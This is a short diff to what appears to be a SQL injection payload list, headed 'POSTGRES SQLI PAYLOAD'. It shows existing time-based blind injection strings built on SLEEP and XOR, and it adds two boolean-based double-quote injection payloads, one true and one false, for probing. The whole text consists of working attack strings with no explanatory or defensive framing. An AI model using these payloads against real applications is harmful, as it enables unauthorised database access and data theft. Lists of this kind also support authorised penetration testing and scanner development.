@@ -123,3 +123,8 @@ POSTGRES SQLI PAYLOAD
 '+AND+(SELECT+2111+FROM+(SELECT(SLEEP(5)))AbKz)+AND+'jpmA'='jpmA
 'XOR(select*from(select(sleep(7)))a)XOR'Z--%20-+
 'XOR(select*from(select(sleep(7)))a)XOR'Z-- -+
+
+SQLI with double quotes:
+-1" +OR+3*2*1=6+AND+000343=000343+--+
+-1" +OR+3*2*1=6+AND+000343=000342+--+
+
